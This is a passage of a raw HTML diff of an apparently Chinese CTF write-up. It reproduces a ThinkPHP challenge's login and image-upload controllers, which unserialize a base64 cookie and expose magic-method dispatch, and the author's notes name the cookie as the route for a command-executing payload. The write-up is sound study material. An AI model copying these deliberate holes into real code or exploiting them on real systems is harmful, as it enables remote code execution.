class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;login_check()){   <span class="hljs-comment">//&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x767B;&#x5F55;</span></span><br><span class="line">            $curr_url=<span class="hljs-string">&quot;http://&quot;</span>.$_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>].$_SERVER[<span class="hljs-string">&apos;SCRIPT_NAME&apos;</span>].<span class="hljs-string">&quot;/home&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;redirect($curr_url,<span class="hljs-number">302</span>);</span><br><span class="line">            <span class="hljs-keyword">exit</span>();</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&quot;index&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">home</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;login_check()){  <span class="hljs-comment">//&#x518D;&#x5224;&#x65AD;&#x662F;&#x5426;&#x767B;&#x5F55;</span></span><br><span class="line">            $curr_url=<span class="hljs-string">&quot;http://&quot;</span>.$_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>].$_SERVER[<span class="hljs-string">&apos;SCRIPT_NAME&apos;</span>].<span class="hljs-string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;redirect($curr_url,<span class="hljs-number">302</span>);</span><br><span class="line">            <span class="hljs-keyword">exit</span>();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;check_upload_img()){ <span class="hljs-comment">//&#x68C0;&#x67E5;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4E0A;&#x4F20;&#x56FE;&#x7247;</span></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;profile_db[<span class="hljs-string">&apos;username&apos;</span>]);</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&quot;upload&quot;</span>);</span><br><span class="line">        }<span class="hljs-keyword">else</span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&quot;img&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;profile_db[<span class="hljs-string">&apos;img&apos;</span>]);  <span class="hljs-comment">//</span></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;profile_db[<span class="hljs-string">&apos;username&apos;</span>]);</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&quot;home&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login_check</span><span class="hljs-params">()</span></span>{  <span class="hljs-comment">//&#x767B;&#x5F55;&#x68C0;&#x67E5;  </span></span><br><span class="line">        $profile=cookie(<span class="hljs-string">&apos;user&apos;</span>);    <span class="hljs-comment">//&#x83B7;&#x53D6;cookie</span></span><br><span class="line">        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($profile)){   <span class="hljs-comment">//&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x7A7A;</span></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));    <span class="hljs-comment">//&#x5C06;cookie&#x89E3;&#x7801;&#x540E;&#x53CD;&#x5E8F;&#x5217;&#x5316;</span></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;profile_db=db(<span class="hljs-string">&apos;user&apos;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,intval(<span class="hljs-keyword">$this</span>-&gt;profile[<span class="hljs-string">&apos;ID&apos;</span>]))-&gt;find(); <span class="hljs-comment">//&#x6839;&#x636E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FA;&#x6765;&#x7684;id&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(array_diff(<span class="hljs-keyword">$this</span>-&gt;profile_db,<span class="hljs-keyword">$this</span>-&gt;profile)==<span class="hljs-keyword">null</span>){ <span class="hljs-comment">//&#x8FDB;&#x884C;&#x5DEE;&#x503C;&#x67E5;&#x8BE2;</span></span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_upload_img</span><span class="hljs-params">()</span></span>{ <span class="hljs-comment">//&#x68C0;&#x67E5;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4E0A;&#x4F20;&#x56FE;&#x7247;&#xFF0C;&#x6839;&#x636E;cookie&#x5F53;&#x4E2D;&#x548C;&#x67E5;&#x8BE2;&#x51FA;&#x6765;&#x7684;&#x6570;&#x636E;</span></span><br><span class="line">        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;profile_db)){</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;profile_db[<span class="hljs-string">&apos;img&apos;</span>])){</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        cookie(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-keyword">null</span>);</span><br><span class="line">        $curr_url=<span class="hljs-string">&quot;http://&quot;</span>.$_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>].$_SERVER[<span class="hljs-string">&apos;SCRIPT_NAME&apos;</span>].<span class="hljs-string">&quot;/index&quot;</span>;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;redirect($curr_url,<span class="hljs-number">302</span>);</span><br><span class="line">        <span class="hljs-keyword">exit</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($name)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x91CC;&#x9762;&#x4E0E;&#x4E00;&#x4E2A;&#x9898;&#x76EE;&#x76F8;&#x5173;&#x4E14;&#x91CD;&#x8981;&#x7684;&#x51FD;&#x6570;&#x4E3A;login_check()&#xFF1A;</p>
+<p>&#x51FD;&#x6570;&#x4E2D;&#x5148;&#x83B7;&#x53D6;cookie&#xFF0C;&#x5982;&#x679C;cookie&#x4E0D;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x5C06;cookie&#x8FDB;&#x884C;base64&#x89E3;&#x7801;&#x4E4B;&#x540E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;</p>
+<p>&#x8FD9;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x51FD;&#x6570;&#x4E5F;&#x5C31;&#x662F;&#x89E3;&#x9898;&#x7684;&#x5165;&#x53E3;&#xFF0C;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x6784;&#x9020;&#x5E8F;&#x5217;&#x5316;&#x7684;payload&#x8D4B;&#x503C;&#x5230;cookie&#x91CC;&#xFF0C;&#x7ECF;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x6267;&#x884C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x547D;&#x4EE4;&#x3002;</p>
 <p><strong>Profile.php</strong> </p>
-<p>当图片上传时，此页面会对图片进行一定的处理并更新用户信息和cookie内容。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span>   </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index(); </span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>); </span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123; </span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123; </span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;    <span class="comment">//给图片加个后缀.png</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];     <span class="comment">//原图片的名字</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>; <span class="comment">//修改后的图片名字</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();     <span class="comment">//进行图片检查</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;    <span class="comment">//判断是否成功修改后缀</span></span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;                <span class="comment">//获取图片大小</span></span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);       <span class="comment">//将老图片的地址改为修改后的地址。</span></span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);              <span class="comment">//删除</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;    <span class="comment">//赋值$this-&gt;img</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();    <span class="comment">//上传图片</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>)); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $user_info=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,<span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'ID'</span>])-&gt;find();  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($user_info[<span class="string">'img'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;img)&#123; </span><br><span class="line">            <span class="keyword">if</span>(db(<span class="string">'user'</span>)-&gt;where(<span class="string">'ID'</span>,$user_info[<span class="string">'ID'</span>])-&gt;data([<span class="string">"img"</span>=&gt;addslashes(<span class="keyword">$this</span>-&gt;img)])-&gt;update())&#123; </span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_cookie(); </span><br><span class="line">                <span class="keyword">$this</span>-&gt;success(<span class="string">'Upload img successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Upload file failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img; </span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;    </span><br><span class="line">        $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=end($ext_arr);   </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name]; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>做题的时候为了帮自己理清楚源码逻辑，尝试把每一个语句都打上注释，结果还是没找到重点。</p>
-<p>由于最重要的就是图片上传的函数，直接来看：</p>
-<p>upload_img()函数，当有图片上传时，它会经过以下几个步骤：</p>
+<p>&#x5F53;&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x65F6;&#xFF0C;&#x6B64;&#x9875;&#x9762;&#x4F1A;&#x5BF9;&#x56FE;&#x7247;&#x8FDB;&#x884C;&#x4E00;&#x5B9A;&#x7684;&#x5904;&#x7406;&#x5E76;&#x66F4;&#x65B0;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x548C;cookie&#x5185;&#x5BB9;&#x3002;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="hljs-keyword">public</span> $ext;</span><br><span class="line">    <span class="hljs-keyword">public</span> $img;</span><br><span class="line">    <span class="hljs-keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>   </span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-keyword">new</span> Index(); </span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="hljs-string">&apos;REMOTE_ADDR&apos;</span>]);</span><br><span class="line">        @chdir(<span class="hljs-string">&quot;../public/upload&quot;</span>); </span><br><span class="line">        <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-keyword">$this</span>-&gt;upload_menu)){</span><br><span class="line">            @mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        }</span><br><span class="line">        @chdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span><span class="hljs-params">()</span></span>{ </span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker){ </span><br><span class="line">            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check()){ </span><br><span class="line">                $curr_url=<span class="hljs-string">&quot;http://&quot;</span>.$_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>].$_SERVER[<span class="hljs-string">&apos;SCRIPT_NAME&apos;</span>].<span class="hljs-string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;redirect($curr_url,<span class="hljs-number">302</span>);</span><br><span class="line">                <span class="hljs-keyword">exit</span>();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES)){    <span class="hljs-comment">//&#x7ED9;&#x56FE;&#x7247;&#x52A0;&#x4E2A;&#x540E;&#x7F00;.png</span></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>];     <span class="hljs-comment">//&#x539F;&#x56FE;&#x7247;&#x7684;&#x540D;&#x5B57;</span></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;filename=md5($_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;name&apos;</span>]).<span class="hljs-string">&quot;.png&quot;</span>; <span class="hljs-comment">//&#x4FEE;&#x6539;&#x540E;&#x7684;&#x56FE;&#x7247;&#x540D;&#x5B57;</span></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;ext_check();     <span class="hljs-comment">//&#x8FDB;&#x884C;&#x56FE;&#x7247;&#x68C0;&#x67E5;</span></span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) {    <span class="hljs-comment">//&#x5224;&#x65AD;&#x662F;&#x5426;&#x6210;&#x529F;&#x4FEE;&#x6539;&#x540E;&#x7F00;</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) {                <span class="hljs-comment">//&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x5927;&#x5C0F;</span></span><br><span class="line">                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);       <span class="hljs-comment">//&#x5C06;&#x8001;&#x56FE;&#x7247;&#x7684;&#x5730;&#x5740;&#x6539;&#x4E3A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x5730;&#x5740;&#x3002;</span></span><br><span class="line">                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);              <span class="hljs-comment">//&#x5220;&#x9664;</span></span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;</span>;    <span class="hljs-comment">//&#x8D4B;&#x503C;$this-&gt;img</span></span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;update_img();    <span class="hljs-comment">//&#x4E0A;&#x4F20;&#x56FE;&#x7247;</span></span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&apos;Forbidden type!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>));</span><br><span class="line">            }</span><br><span class="line">        }<span class="hljs-keyword">else</span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&apos;Unknow file type!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>)); </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_img</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        $user_info=db(<span class="hljs-string">&apos;user&apos;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&apos;ID&apos;</span>])-&gt;find();  </span><br><span class="line">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($user_info[<span class="hljs-string">&apos;img&apos;</span>]) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;img){ </span><br><span class="line">            <span class="hljs-keyword">if</span>(db(<span class="hljs-string">&apos;user&apos;</span>)-&gt;where(<span class="hljs-string">&apos;ID&apos;</span>,$user_info[<span class="hljs-string">&apos;ID&apos;</span>])-&gt;data([<span class="hljs-string">&quot;img&quot;</span>=&gt;addslashes(<span class="hljs-keyword">$this</span>-&gt;img)])-&gt;update()){ </span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;update_cookie(); </span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&apos;Upload img successful!&apos;</span>, url(<span class="hljs-string">&apos;../home&apos;</span>));</span><br><span class="line">            }<span class="hljs-keyword">else</span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&apos;Upload file failed!&apos;</span>, url(<span class="hljs-string">&apos;../index&apos;</span>));</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    